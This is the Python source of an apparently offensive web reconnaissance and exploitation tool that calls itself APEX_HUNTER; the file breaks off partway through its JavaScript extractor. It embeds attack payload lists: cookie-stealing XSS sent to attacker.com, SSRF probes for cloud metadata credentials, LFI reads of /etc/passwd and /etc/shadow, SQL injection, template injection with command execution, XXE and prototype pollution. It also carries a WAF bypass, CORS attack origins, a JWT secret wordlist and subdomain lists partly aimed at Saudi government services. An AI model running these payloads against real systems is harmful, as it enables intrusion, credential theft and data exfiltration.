#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
APEX_HUNTER v1.0 — Advanced Professional Exploitation & Recon Hunter
═════════════════════════════════════════════════════════════════════
35 Integrated Tools | 45 Security Skills | Full Auto-Chain Execution

Merges: TITAN_HUNTER v1.0 + Advanced_Recon v2.0 + REDTEAM.PY v3.0
New:    15 Advanced Techniques

Usage:
  python APEX_HUNTER.py --target https://example.com --output ./out
  python APEX_HUNTER.py --target https://t1.com --target https://t2.com --output ./out
  python APEX_HUNTER.py --target https://example.com --output ./out --phases 1,2,3
  python APEX_HUNTER.py --skills
  python APEX_HUNTER.py --target https://example.com --output ./out --workers 15 --rate 3.0

Authorized bug-bounty / legal security research ONLY.
"""
from __future__ import annotations
import argparse, asyncio, base64, binascii, calendar, csv, hashlib
import html, ipaddress, json, math, os, re, socket, ssl, string
import struct, sys, time, urllib.error, urllib.parse, urllib.request
from collections import Counter, defaultdict
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs

try:
    import aiohttp; HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    import requests; HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ── Console colors ────────────────────────────────────────────
class C:
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
    CYAN='\033[0;36m'; BLUE='\033[0;34m'; PURPLE='\033[0;35m'
    WHITE='\033[1;37m'; DIM='\033[2m'; BOLD='\033[1m'; NC='\033[0m'

def banner(m): print(f"\n{C.CYAN}[*] {m}{C.NC}")
def ok(m):     print(f"{C.GREEN}[+] {m}{C.NC}")
def warn(m):   print(f"{C.YELLOW}[!] {m}{C.NC}")
def high(m):   print(f"{C.RED}[!!] {m}{C.NC}")
def info(m):   print(f"{C.DIM}    {m}{C.NC}")
def skill(m):  print(f"{C.PURPLE}[SKILL] {m}{C.NC}")

# ══════════════════════════════════════════════════════════════
# EMBEDDED PAYLOADS & WORDLISTS
# ══════════════════════════════════════════════════════════════
PAYLOADS_XSS = [
    "<script>alert(1)</script>", '"><script>alert(1)</script>',
    "'><script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    '"><img src=x onerror=alert(1)>', "<svg onload=alert(1)>",
    "<svg><animate onbegin=alert(1)>", "<details open ontoggle=alert(1)>",
    "javascript:alert(1)", "javascript:alert(document.cookie)",
    '" onmouseover="alert(1)', "' onfocus='alert(1)",
    "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
    "</title><script>alert(1)</script>", "</textarea><script>alert(1)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
    "مرحبا<script>alert(1)</script>",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\x3e",
]

PAYLOADS_SSRF = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://localhost/", "http://127.0.0.1/", "http://0.0.0.0/",
    "http://[::1]/", "http://127.1/", "http://2130706433/",
    "http://169.254.169.254/openstack/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://127.0.0.1:9200/", "http://127.0.0.1:6379/",
    "http://127.0.0.1:27017/", "http://127.0.0.1:5432/",
]

PAYLOADS_LFI = [
    "../../../../etc/passwd", "../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "../../../../etc/shadow", "../../../../proc/self/environ",
    "../../../../proc/self/cmdline", "/etc/passwd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "../../../../windows/system32/drivers/etc/hosts",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

PAYLOADS_SQLI = [
    "'", '"', "''", '``', "' OR '1'='1", "' OR '1'='1'--",
    '" OR "1"="1', "1 AND 1=1", "1 AND 1=2",
    "1' ORDER BY 1--", "1' ORDER BY 2--",
    "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
    "' AND SLEEP(0)--", "; WAITFOR DELAY '0:0:0'--",
    '{"$gt": ""}', '{"$ne": null}',
]

PAYLOADS_SSTI = [
    "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
    "{{7*'7'}}", "{{'7'*7}}", "{% for i in range(7) %}{{i}}{% endfor %}",
    "{{config}}", "{{self}}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "${{7*7}}", "{#{7*7}}", "{{1+1}}", "@(7*7)",
]

PAYLOADS_XXE = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
]

PAYLOADS_PROTO_POLLUTION = [
    '{"__proto__":{"polluted":"APEX_HUNTER"}}',
    '{"constructor":{"prototype":{"polluted":"APEX_HUNTER"}}}',
    '{"__proto__.polluted":"APEX_HUNTER"}',
]

WORDLIST_SUBDOMAINS = [
    "www","api","dev","staging","uat","test","beta","alpha","prod","demo",
    "sandbox","qa","auth","login","sso","oauth","admin","portal","console",
    "dashboard","app","mobile","m","web","help","support","mail","smtp",
    "ftp","sftp","cdn","static","assets","media","upload","git","jenkins",
    "ci","monitor","grafana","kibana","elastic","vpn","remote","internal",
    "intranet","db","database","cache","redis","backup","eservices","eportal",
    "citizen","national","nafath","absher","tamm","book","booking","flight",
    "checkin","reservation","loyalty","cargo","b2b","agent","v1","v2","v3",
    "api2","api3","api-v1","api-v2","services","gateway","integration","ws",
    "webhook","secure","vault","config","preprod","preview","hotfix","old","new",
    "ar","en","ksa","sa","app1","app2","test1","test2","dev1","dev2",
]

WORDLIST_API_PATHS = [
    "/api","/api/v1","/api/v2","/api/v3","/rest","/rest/v1","/v1","/v2","/v3",
    "/graphql","/graphiql","/playground","/gql","/query",
    "/api/auth","/api/login","/api/logout","/api/register","/api/token",
    "/api/refresh","/api/reset-password","/api/oauth","/oauth/token",
    "/oauth/authorize","/.well-known/openid-configuration",
    "/api/user","/api/users","/api/me","/api/profile","/api/account",
    "/api/session","/api/search","/api/tickets","/api/ticket",
    "/api/requests","/api/orders","/api/order","/api/bookings","/api/booking",
    "/api/flights","/api/pnr","/api/checkin","/api/config","/api/settings",
    "/api/health","/api/status","/api/ping","/api/version","/api/info",
    "/api/admin","/api/debug","/api/webhooks","/api/notifications",
    "/api/payments","/api/invoices","/api/reports","/api/export",
    "/swagger","/swagger.json","/swagger-ui","/swagger-ui.html",
    "/openapi.json","/openapi.yaml","/api-docs","/redoc",
    "/actuator","/actuator/health","/actuator/env","/actuator/info",
    "/actuator/metrics","/actuator/beans","/actuator/heapdump",
    "/.env","/.git/HEAD","/.git/config","/config.json","/package.json",
    "/robots.txt","/sitemap.xml","/.well-known/security.txt",
    "/server-status","/phpinfo.php","/admin","/administrator",
    "/wp-admin","/wp-login.php","/phpmyadmin",
    "/api/v1/users","/api/v1/auth","/api/v2/users","/api/v2/tickets",
    "/hc/api/v2/requests","/hc/requests",
    "/api/graphql","/v1/graphql","/api/graph",
]

WORDLIST_JWT_SECRETS = [
    "secret","password","123456","secret123","jwt_secret","supersecret",
    "mysecret","changeme","letmein","qwerty","abc123","test","admin",
    "key","private","token","authsecret","jwtsecret","app_secret",
]

# ══════════════════════════════════════════════════════════════
# DATACLASSES
# ══════════════════════════════════════════════════════════════
@dataclass
class Finding:
    id: str; title: str; severity: str; cwe: str; cvss: float
    description: str; poc_curl: str
    evidence: str = ""; reproduction: str = ""
    burp_request: str = ""; category: str = ""; remediation: str = ""

@dataclass
class TargetProfile:
    url: str; apex: str; host: str; scheme: str
    ip: str = ""; asn: str = ""; provider: str = ""
    tls_version: str = ""; tls_cipher: str = ""
    cert_cn: str = ""; cert_sans: List[str] = field(default_factory=list)
    cert_issuer: str = ""; cert_expires: str = ""
    waf: List[str] = field(default_factory=list)
    technologies: List[str] = field(default_factory=list)
    subdomains: List[str] = field(default_factory=list)
    ct_subdomains: List[str] = field(default_factory=list)
    wayback_urls: List[str] = field(default_factory=list)
    js_files: List[str] = field(default_factory=list)
    api_endpoints: List[str] = field(default_factory=list)
    graphql_endpoints: List[str] = field(default_factory=list)
    sensitive_paths: List[str] = field(default_factory=list)
    s3_buckets: List[str] = field(default_factory=list)
    findings: List[Finding] = field(default_factory=list)
    security_headers: Dict[str, Any] = field(default_factory=dict)
    cors_results: List[Dict] = field(default_factory=list)
    cookie_results: List[Dict] = field(default_factory=list)
    secrets: List[Dict] = field(default_factory=list)
    open_redirects: List[str] = field(default_factory=list)
    ssrf_params: List[str] = field(default_factory=list)
    parameters: List[str] = field(default_factory=list)
    forms: List[Dict] = field(default_factory=list)
    jwt_tokens: List[Dict] = field(default_factory=list)
    oauth_endpoints: List[str] = field(default_factory=list)
    websocket_endpoints: List[str] = field(default_factory=list)
    ssti_params: List[str] = field(default_factory=list)
    smuggling_results: List[Dict] = field(default_factory=list)

@dataclass
class Config:
    targets: List[str]
    output: str
    workers: int = 10; rate: float = 2.0; depth: int = 3; timeout: int = 20
    scope_extras: List[str] = field(default_factory=list)
    phases: List[int] = field(default_factory=lambda: list(range(1, 8)))
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    ua_bot: str = "Googlebot/2.1 (+http://www.google.com/bot.html)"

    @property
    def ua(self) -> str:
        return self.user_agent

# ══════════════════════════════════════════════════════════════
# HTTP HELPERS
# ══════════════════════════════════════════════════════════════
def _ssl_ctx():
    ctx = ssl._create_unverified_context()
    ctx.check_hostname = False
    return ctx

class _Resp(tuple):
    """Backward-compatible fetch result: unpack as (status, body_str, headers)
    OR access as .status / .body (bytes) / .headers for Phase 9-14 tools."""
    __slots__ = ()
    @property
    def status(self):  return self[0]
    @property
    def body(self):    return self[1].encode("utf-8") if self[1] else b""
    @property
    def headers(self): return self[2]
    def __bool__(self):return self[0] != 0

def _fetch(url: str, ua: str, timeout: int, method: str = "GET",
           data: bytes = None, headers_extra: Dict = None,
           extra_headers: Dict = None,
           return_headers: bool = False) -> "_Resp":
    try:
        h = {"User-Agent": ua, "Accept": "text/html,application/json,*/*",
             "Accept-Language": "ar,en-US;q=0.7,en;q=0.3"}
        if headers_extra:  h.update(headers_extra)
        if extra_headers:  h.update(extra_headers)
        req = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            body = r.read(2_000_000).decode("utf-8", errors="replace")
            hdrs = {k.lower(): v for k, v in r.headers.items()}
            return _Resp((r.status, body, hdrs))
    except urllib.error.HTTPError as e:
        try:
            body = e.read(5000).decode("utf-8", errors="replace")
        except Exception:
            body = ""
        hdrs = {k.lower(): v for k, v in e.headers.items()}
        return _Resp((e.code, body, hdrs))
    except Exception:
        return _Resp((0, "", {}))

def _head(url: str, ua: str, timeout: int, headers_extra: Dict = None) -> Tuple[int, Dict]:
    code, _, hdrs = _fetch(url, ua, timeout, method="HEAD", headers_extra=headers_extra)
    if code == 0:  # some servers don't support HEAD
        code, _, hdrs = _fetch(url, ua, timeout, headers_extra=headers_extra)
    return code, hdrs

# ══════════════════════════════════════════════════════════════
# TOOL 1: DNS RESOLVER  (SKILL-01, SKILL-22, SKILL-23)
# ══════════════════════════════════════════════════════════════
class DNSResolver:
    ASN_RANGES = [
        ("104.16.0.0/12","Cloudflare (AS13335)"),("172.64.0.0/13","Cloudflare (AS13335)"),
        ("20.0.0.0/8","Microsoft Azure (AS8075)"),("13.0.0.0/8","Microsoft Azure (AS8075)"),
        ("52.0.0.0/8","Amazon AWS (AS16509)"),("54.0.0.0/8","Amazon AWS (AS16509)"),
        ("185.169.0.0/16","ZAIN/STC Saudi Arabia"),("164.215.0.0/16","Saudi Gov Network (MCIT)"),
        ("192.168.0.0/16","RFC1918 Private"),("10.0.0.0/8","RFC1918 Private"),
    ]

    def resolve(self, h: str) -> str:
        try: return socket.gethostbyname(h)
        except: return "NXDOMAIN"

    def classify(self, ip: str) -> str:
        try:
            a = ipaddress.ip_address(ip)
            for cidr, name in self.ASN_RANGES:
                if a in ipaddress.ip_network(cidr, strict=False): return name
        except: pass
        return "Unknown"

    def wildcard_check(self, apex: str) -> bool:
        rand = f"notexist-{int(time.time())}-xyzabc.{apex}"
        return self.resolve(rand) != "NXDOMAIN"

    def run(self, profile: TargetProfile) -> TargetProfile:
        skill("DNS-01: Resolving target + ASN + wildcard check")
        h = profile.host; apex = profile.apex
        ip = self.resolve(h)
        profile.ip = ip
        profile.provider = self.classify(ip)
        ok(f"  {h} → {ip} ({profile.provider})")
        live = []
        for sub in WORDLIST_SUBDOMAINS[:40]:
            fqdn = f"{sub}.{apex}"
            r = self.resolve(fqdn)
            if r != "NXDOMAIN":
                live.append(fqdn); info(f"  {fqdn} → {r}")
        profile.subdomains = live
        if self.wildcard_check(apex):
            warn(f"  WILDCARD DNS on {apex} — filter subdomain results!")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 2: TLS ANALYZER  (SKILL-02, SKILL-25)
# ══════════════════════════════════════════════════════════════
class TLSAnalyzer:
    def run(self, profile: TargetProfile) -> TargetProfile:
        skill("TLS-02: Cipher, version, cert, SAN, ACME detection")
        try:
            ctx = _ssl_ctx()
            with socket.create_connection((profile.host, 443), timeout=10) as s:
                with ctx.wrap_socket(s, server_hostname=profile.host) as ss:
                    profile.tls_version = ss.version() or ""
                    profile.tls_cipher  = ss.cipher()[0] if ss.cipher() else ""
                    cert = ss.getpeercert()
                    if cert:
                        subj = dict(x[0] for x in cert.get("subject", []))
                        issr = dict(x[0] for x in cert.get("issuer", []))
                        profile.cert_cn     = subj.get("commonName", "")
                        profile.cert_issuer = issr.get("organizationName", "")
                        profile.cert_expires= cert.get("notAfter", "")
                        profile.cert_sans   = [v for k,v in cert.get("subjectAltName",[])]
            ok(f"  {profile.tls_version} / {profile.tls_cipher}")
            ok(f"  CN={profile.cert_cn} expires={profile.cert_expires}")
            # Short-lived cert detection
            if profile.cert_expires:
                from email.utils import parsedate
                t = parsedate(profile.cert_expires)
                if t:
                    days = (calendar.timegm(t) - time.time()) / 86400
                    if days < 45:
                        warn(f"  Short-lived cert ({int(days)}d) — ACME/Let's Encrypt rotation")
        except Exception as e:
            warn(f"  TLS probe: {e}")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 3: CT LOG SCANNER  (SKILL-03)
# ══════════════════════════════════════════════════════════════
class CTLogScanner:
    def run(self, profile: TargetProfile) -> TargetProfile:
        skill("CT-03: Certificate Transparency log mining (crt.sh)")
        try:
            url = f"https://crt.sh/?q=%25.{profile.apex}&output=json"
            req = urllib.request.Request(url, headers={"User-Agent": "APEX/1.0"})
            with urllib.request.urlopen(req, timeout=15) as r:
                data = json.loads(r.read().decode())
            seen = set()
            for row in data:
                for n in str(row.get("name_value","")).splitlines():
                    n = n.strip().lstrip("*.").lower()
                    if n and "@" not in n and " " not in n and n.endswith(profile.apex):
                        seen.add(n)
            profile.ct_subdomains = sorted(seen)
            ok(f"  {len(profile.ct_subdomains)} subdomains in CT logs")
            for s in profile.ct_subdomains[:10]: info(f"  {s}")
        except Exception as e:
            warn(f"  CT log query failed (run locally): {e}")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 4: WAYBACK MINER  (SKILL-04)
# ══════════════════════════════════════════════════════════════
class WaybackMiner:
    def run(self, profile: TargetProfile) -> TargetProfile:
        skill("WAYBACK-04: Mining archived URLs + parameter extraction")
        try:
            url = (f"https://web.archive.org/cdx/search/cdx"
                   f"?url=*.{profile.apex}/*&output=json&fl=original"
                   f"&collapse=urlkey&limit=3000")
            req = urllib.request.Request(url, headers={"User-Agent": "APEX/1.0"})
            with urllib.request.urlopen(req, timeout=20) as r:
                rows = json.loads(r.read().decode())
            urls = set()
            for row in (rows[1:] if rows and isinstance(rows[0], list) else rows):
                if isinstance(row, list) and row: urls.add(row[0])
                elif isinstance(row, str): urls.add(row)
            profile.wayback_urls = sorted(urls)
            ok(f"  {len(profile.wayback_urls)} archived URLs")
            interesting = [u for u in profile.wayback_urls if re.search(
                r'\.(json|xml|csv|bak|sql|env|key|pem)|api/|admin/|config|token=|password=', u, re.I)]
            if interesting:
                warn(f"  {len(interesting)} interesting archived URLs")
                for u in interesting[:5]: info(f"  {u}")
        except Exception as e:
            warn(f"  Wayback failed (run locally): {e}")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 5: WAF DETECTOR  (SKILL-05, SKILL-24)
# ══════════════════════════════════════════════════════════════
class WAFDetector:
    WAF_HEADERS = {
        "Cloudflare":    ["cf-ray","cf-cache-status","cf-request-id"],
        "Akamai":        ["x-akamai-transformed","x-akamai-request-id"],
        "AWS CloudFront":["x-amz-cf-id","x-amz-cf-pop"],
        "Fastly":        ["x-fastly-request-id","x-served-by","x-timer"],
        "Varnish":       ["x-varnish"],
        "Incapsula":     ["x-iinfo","x-cdn"],
        "Sucuri":        ["x-sucuri-id","x-sucuri-cache"],
        "DataDome":      ["x-datadome-cid"],
        "Reblaze":       ["x-reblaze-protection"],
        "F5 BIG-IP":     ["x-wa-info"],
        "Imperva":       ["x-iinfo"],
        "PerimeterX":    ["_pxhd","x-px-"],
        "AWS WAF":       ["x-amzn-requestid","x-amzn-trace-id"],
        "ModSecurity":   ["x-modsecurity"],
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("WAF-05: WAF/CDN fingerprinting + Googlebot bypass")
        code, _, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        detected = []
        for waf, h_list in self.WAF_HEADERS.items():
            for h in h_list:
                if h in hdrs and waf not in detected:
                    detected.append(waf)
                    ok(f"  WAF: {waf} (via {h}: {hdrs[h][:50]})")
        server = hdrs.get("server","")
        if server: info(f"  Server: {server}")
        # Googlebot bypass
        bot_code, _, _ = _fetch(profile.url, cfg.ua_bot, cfg.timeout)
        if code not in (0,200) and bot_code == 200:
            high(f"  WAF BYPASS: Googlebot UA returns 200 vs browser {code}!")
            profile.findings.append(Finding(
                id=f"F-WAF-001", title="WAF Bypass via Googlebot UA",
                severity="MEDIUM", cwe="CWE-693", cvss=5.3,
                description="WAF bypassed using Googlebot user-agent string.",
                evidence=f"Browser: {code} | Googlebot: {bot_code}",
                reproduction=f"curl -A '{cfg.ua_bot}' '{profile.url}'",
                poc_curl=f"curl -sk -A '{cfg.ua_bot}' '{profile.url}'",
                category="WAF Bypass",
                remediation="Block bot impersonation in WAF rules."
            ))
            detected.append("BYPASS:Googlebot")
        profile.waf = detected
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 6: TECHNOLOGY FINGERPRINTER  (SKILL-06)
# ══════════════════════════════════════════════════════════════
class TechFingerprinter:
    SIGS = {
        "React":r"__reactFiber|data-reactroot|react\.development|ReactDOM",
        "Vue.js":r"__vue__|v-bind:|vue\.runtime|__VUE__",
        "Angular":r"ng-version|_nghost|angular\.min|ng-app",
        "Next.js":r"__NEXT_DATA__|/_next/static",
        "Nuxt.js":r"__nuxt|_nuxt/|__NUXT__",
        "WordPress":r"wp-content|wp-includes|wp-json",
        "Drupal":r"Drupal\.settings|drupal\.js|/sites/default/files",
        "Joomla":r"joomla|option=com_",
        "SharePoint":r"_layouts/|_vti_bin|SharePoint",
        "jQuery":r"jquery\.min\.js|jQuery\.fn|jquery-\d+",
        "Bootstrap":r"bootstrap\.min\.css|bootstrap\.bundle",
        "PHP":r"\.php\b|PHPSESSID",
        "ASP.NET":r"__VIEWSTATE|asp\.net|\.aspx\b|X-AspNet-Version",
        "Zendesk":r"zendesk\.com|zdassets\.com|zopim",
        "Freshdesk":r"freshdesk\.com|freshwidget",
        "Salesforce":r"salesforce\.com|force\.com|\.lightning\.",
        "Google Analytics":r"google-analytics\.com|gtag\(",
        "GTM":r"googletagmanager\.com|GTM-[A-Z0-9]+",
        "CloudFront":r"cloudfront\.net|x-amz-cf",
        "Amazon S3":r"s3\.amazonaws\.com|s3-[a-z]+-[0-9]+\.amazonaws",
        "Nginx":r"nginx/|Server: nginx",
        "Apache":r"Apache/|Server: Apache",
        "IIS":r"Microsoft-IIS|X-Powered-By: ASP",
        "Node.js":r"X-Powered-By: Express|node\.js",
        "Django":r"csrfmiddlewaretoken|django",
        "Laravel":r"laravel_session|XSRF-TOKEN",
        "Spring":r"JSESSIONID|spring|\.do\b",
        "Ruby on Rails":r"_session_id|rails",
        "GraphQL":r"graphql|__schema|__typename",
        "Swagger":r"swagger-ui|openapi|api-docs",
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("TECH-06: Technology stack fingerprinting (30 signatures)")
        code, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        combined = body + "\n" + "\n".join(f"{k}: {v}" for k,v in hdrs.items())
        detected = []
        for tech, pat in self.SIGS.items():
            if re.search(pat, combined, re.I):
                detected.append(tech); ok(f"  Technology: {tech}")
        for k, v in hdrs.items():
            if re.search(r"x-powered-by|x-generator|x-aspnet|x-drupal", k, re.I):
                ok(f"  Header disclosure: {k}: {v}")
        profile.technologies = detected
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 7: SECURITY HEADER AUDITOR  (SKILL-07)
# ══════════════════════════════════════════════════════════════
class SecurityHeaderAuditor:
    CHECKS = {
        "strict-transport-security":      (20, lambda v: "max-age" in v.lower()),
        "content-security-policy":        (20, lambda v: bool(v)),
        "x-content-type-options":         (10, lambda v: "nosniff" in v.lower()),
        "x-frame-options":                (10, lambda v: v.upper() in ["DENY","SAMEORIGIN"]),
        "referrer-policy":                ( 5, lambda v: bool(v)),
        "permissions-policy":             ( 5, lambda v: bool(v)),
        "x-xss-protection":               ( 5, lambda v: "1" in v),
        "cache-control":                  ( 5, lambda v: "no-store" in v.lower()),
        "cross-origin-opener-policy":     (10, lambda v: bool(v)),
        "cross-origin-resource-policy":   (10, lambda v: bool(v)),
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("HEADERS-07: Security header audit & scoring")
        _, _, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        score = 0; results = {}
        for h, (w, check) in self.CHECKS.items():
            val = hdrs.get(h, "")
            ok_ = check(val) if val else False
            if ok_: score += w; st = "PASS"
            elif val: score += w//2; st = "WEAK"
            else: st = "MISSING"
            results[h] = {"status": st, "value": val}
            col = C.GREEN if st=="PASS" else (C.YELLOW if st=="WEAK" else C.RED)
            print(f"  {col}[{st:7s}]{C.NC} {h}: {val[:55] or '(not set)'}")
        profile.security_headers = {"score": score, "max": 100, "headers": results}
        ok(f"  Score: {score}/100")
        if score < 40:
            profile.findings.append(Finding(
                id="F-HDR-001", title="Critical Security Headers Missing",
                severity="HIGH" if score < 20 else "MEDIUM", cwe="CWE-693", cvss=5.4,
                description=f"Header score {score}/100 — multiple critical headers absent.",
                evidence=json.dumps({k:v["status"] for k,v in results.items()},indent=2),
                reproduction=f"curl -sI '{profile.url}'",
                poc_curl=f"curl -sI '{profile.url}'",
                category="Security Headers",
                remediation="Implement HSTS, CSP, X-Frame-Options, X-Content-Type-Options."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 8: CSP ANALYZER  (SKILL-08)
# ══════════════════════════════════════════════════════════════
class CSPAnalyzer:
    WEAKNESSES = [
        (r"script-src[^;]*'unsafe-inline'","HIGH","unsafe-inline allows XSS"),
        (r"script-src[^;]*'unsafe-eval'","HIGH","unsafe-eval allows code injection"),
        (r"script-src\s+\*|default-src\s+\*","HIGH","Wildcard source — any origin"),
        (r"script-src[^;]*data:","MEDIUM","data: URI in script-src"),
        (r"script-src[^;]*http:","MEDIUM","Plain HTTP source in CSP"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CSP-08: Content Security Policy weakness analysis")
        csp = (profile.security_headers.get("headers",{})
               .get("content-security-policy",{}).get("value",""))
        if not csp:
            warn("  No CSP — XSS fully unmitigated"); return profile
        for pat, sev, desc in self.WEAKNESSES:
            if re.search(pat, csp, re.I):
                col = C.RED if sev == "HIGH" else C.YELLOW
                print(f"  {col}[CSP-{sev}]{C.NC} {desc}")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 9: CORS ANALYZER  (SKILL-09)
# ══════════════════════════════════════════════════════════════
class CORSAnalyzer:
    ORIGINS = [
        ("REFLECTED", "{host}"),
        ("NULL",      "null"),
        ("EVIL_SUB",  "evil.{apex}"),
        ("APEX_SFX",  "{apex}.evil.com"),
        ("ATTACKER",  "attacker.{apex}"),
        ("HTTP_DOWN", "http://{host}"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CORS-09: CORS misconfiguration (6 bypass patterns)")
        host = profile.host; apex = profile.apex
        vulns = []
        for label, tpl in self.ORIGINS:
            origin = tpl.replace("{host}", host).replace("{apex}", apex)
            _, _, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout,
                                headers_extra={"Origin": origin,
                                "Access-Control-Request-Method": "GET"})
            acao = hdrs.get("access-control-allow-origin","")
            acac = hdrs.get("access-control-allow-credentials","").lower()
            profile.cors_results.append({"label":label,"origin":origin,"acao":acao,"acac":acac})
            if acao and (acao == origin or acao == "*"):
                lv = "CRITICAL" if (acao==origin and acac=="true") else "HIGH"
                high(f"  CORS [{label}]: ACAO={acao} ACAC={acac}")
                vulns.append({"origin":origin,"label":label,"acao":acao,"acac":acac,"level":lv})
        if vulns:
            w = max(vulns, key=lambda x:{"CRITICAL":4,"HIGH":3,"MEDIUM":2}.get(x["level"],0))
            profile.findings.append(Finding(
                id="F-CORS-001", title="CORS Misconfiguration",
                severity=w["level"], cwe="CWE-942",
                cvss=8.1 if w["level"]=="CRITICAL" else 6.5,
                description=f"{len(vulns)} CORS bypass patterns confirmed.",
                evidence="\n".join(f"{v['label']}: {v['acao']} creds={v['acac']}" for v in vulns),
                reproduction=f"curl -H 'Origin: {w['origin']}' -I '{profile.url}'",
                poc_curl=f"curl -sk -H 'Origin: {w['origin']}' -I '{profile.url}'",
                burp_request=f"GET / HTTP/1.1\nHost: {host}\nOrigin: {w['origin']}\n",
                category="CORS",
                remediation="Implement an explicit allowlist. Never reflect Origin header directly."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 10: COOKIE AUDITOR  (SKILL-10)
# ══════════════════════════════════════════════════════════════
class CookieAuditor:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("COOKIE-10: Cookie security attribute audit")
        import http.cookiejar
        cj = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(cj),
            urllib.request.HTTPSHandler(context=_ssl_ctx()))
        try:
            opener.open(urllib.request.Request(
                profile.url, headers={"User-Agent": cfg.user_agent}), timeout=cfg.timeout)
        except Exception: pass
        issues = []
        for c in cj:
            ci = []
            if not c.secure: ci.append("missing Secure")
            if not c.has_nonstandard_attr("HttpOnly"): ci.append("missing HttpOnly")
            if not c.has_nonstandard_attr("SameSite"): ci.append("missing SameSite")
            profile.cookie_results.append({"name":c.name,"issues":ci})
            if ci:
                warn(f"  Cookie '{c.name}': {', '.join(ci)}")
                issues.append(c.name)
        if issues:
            profile.findings.append(Finding(
                id="F-CK-001", title="Insecure Cookie Configuration",
                severity="MEDIUM", cwe="CWE-1004", cvss=4.7,
                description=f"Cookies {issues} lack security attributes.",
                evidence=str(issues),
                reproduction=f"curl -sc /dev/null -I '{profile.url}'",
                poc_curl=f"curl -sc /dev/null -I '{profile.url}'",
                category="Cookie Security",
                remediation="Set Secure; HttpOnly; SameSite=Strict on all session cookies."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 11: JS EXTRACTOR  (SKILL-11)
# ══════════════════════════════════════════════════════════════
class JSExtractor:
    EP_PATTERNS = [
        r'(?:fetch|axios\.(?:get|post|put|delete))\s*\(\s*["\']([^"\']+)["\']',
        r'(?:url|endpoint|baseURL|API_URL|apiUrl)\s*[=:]\s*["\']([^"\']+)["\']',
        r'(?:\/api\/|\/v\d+\/|\/rest\/)[^\s"\'<>{}]+',
        r'XMLHttpRequest.*?open\s*\(\s*["\'][A-Z]+["\'],\s*["\']([^"\']+)["\']',
    ]

    def _js_urls(self, html_body: str, base: str) -> List[str]:
        refs = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', html_body, re.I)
        out = []
        for r in refs:
            if r.startswith("http"): out.append(r)
            elif r.startswith("//"): out.append("https:" + r)
            elif r.startswith("/"): 
                p = urlparse(base)
                out.append(f"{p.scheme}://{p.netloc}{r}")
            else: out.append(urljoin(base, r))
        return list(set(out))[:30]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("JS-11: JavaScript file discovery + endpoint extraction")
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        js_files = self._js_urls(html_body, profile.url)
        profile.js_files = js_files
        ok(f"  Found {len(js_files)} JS files")
        eps = set(); params = set()
        for jf in js_files[:15]:
